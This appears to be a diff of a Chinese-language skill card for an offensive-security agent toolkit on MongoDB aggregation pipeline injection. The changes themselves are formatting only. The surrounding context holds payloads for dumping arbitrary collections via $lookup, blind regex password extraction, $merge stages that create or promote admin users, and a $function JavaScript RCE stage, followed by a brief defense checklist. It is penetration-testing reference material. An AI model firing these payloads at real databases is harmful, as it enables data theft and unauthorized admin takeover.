@@ -4,7 +4,7 @@ description: 'MongoDB 聚合管道注入：$lookup/$facet/$unionWith/$merge 跨�
 disable-model-invocation: true
 metadata: { domain: db, tier: T3 }
 ---
-> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
+> 📌 DSH 用法：用 skill 工具按名加载本卡。
 
 # NoSQL 聚合管道注入 (MongoDB Aggregation Pipeline Injection)
 
@@ -13,17 +13,17 @@ metadata: { domain: db, tier: T3 }
 
 ## 与传统 NoSQL 注入的区别
 
-```
+```text
 传统 NoSQLi:  ?username[$ne]=1  → 注入到 find() 的 filter
 聚合管道注入: POST body 是 JSON 数组 → 注入到 aggregate() 的 pipeline
               [{ "$match": {...} }, { "$facet": {...} }]  ← 整个数组可控
-```
+```text
 
 **关键：aggregate() 接受数组参数（pipeline），不只是 filter 对象。** 能控制数组 → 能插入任意 stage。
 
 ## 检测
 
-```
+```text
 # 黑盒: 请求体是 JSON 数组 → 大概率是 aggregate()
 [
   { "$match": { "name": "test" } }
@@ -39,16 +39,16 @@ metadata: { domain: db, tier: T3 }
 [
   { "$match": { "username": { "$ne": "" } } }   # $ne 在 filter 中
 ]
-```
+```text
 
 ## 核心技术：$lookup 绕过集合隔离
 
-```
+```text
 "aggregate() 内 $lookup 可以访问数据库中的任意集合，没有权限隔离"
                                              — Meteor Forums, 2017
 
 即使在 $facet 的嵌套子管道中，$lookup 仍然能 dump 任意集合。
-```
+```text
 
 ### 读取其他集合（无需共享字段 — pipeline 模式）
 
@@ -63,7 +63,7 @@ metadata: { domain: db, tier: T3 }
   },
   { "$limit": 1 }
 ]
-```
+```text
 
 ### 盲提取 — $regex 逐字符泄密
 
@@ -81,7 +81,7 @@ metadata: { domain: db, tier: T3 }
   { "$match": { "r": { "$ne": [] } } }
 ]
 # 有结果 → 密码以 a 开头 → 继续枚举 ^aa, ^ab, ^ac...
-```
+```text
 
 ### $unionWith — 直接合并其他集合
 
@@ -90,7 +90,7 @@ metadata: { domain: db, tier: T3 }
   { "$match": { "_id": { "$exists": false } } },
   { "$unionWith": { "coll": "users" } }
 ]
-```
+```text
 
 ### $merge — 写数据！插入新 admin 用户
 
@@ -113,7 +113,7 @@ metadata: { domain: db, tier: T3 }
     }
   }
 ]
-```
+```text
 
 ### 更新已存在的用户为 admin
 
@@ -136,7 +136,7 @@ metadata: { domain: db, tier: T3 }
     }
   }
 ]
-```
+```text
 
 ### $function — JavaScript RCE（需要 server-side JS 启用）
 
@@ -154,7 +154,7 @@ metadata: { domain: db, tier: T3 }
     }
   }
 ]
-```
+```text
 
 ## Odyssey 实例：$facet + $lookup 泄露 invitation token
 
@@ -176,7 +176,7 @@ metadata: { domain: db, tier: T3 }
   { "$unwind": "$leak" }
 ]
 # → 返回所有 pending_invites → 15 个邀请 token → 注册任意用户
-```
+```text
 
 ## 服务端弱点模式
 
@@ -191,17 +191,17 @@ app.post('/search', (req, res) => {
 @app.post("/search")
 async def search(pipeline: list):   # 接受原始 pipeline 数组
     cursor = db.products.aggregate(pipeline)  # 直接执行
-```
+```text
 
 ## 防御
 
-```
+```text
 [ ] 不用 aggregate() → 用 find() (攻击面更小)
 [ ] 必须用 → 从不把用户输入直接当 pipeline
 [ ] 白名单 stage: 只允许 $match, $sort, $limit, $skip
 [ ] 递归过滤 $ 开头的 key（mongo-sanitize）
 [ ] 禁用 server-side JS: mongod --noscripting
-```
+```text
 
 ## 🔴 重点
 
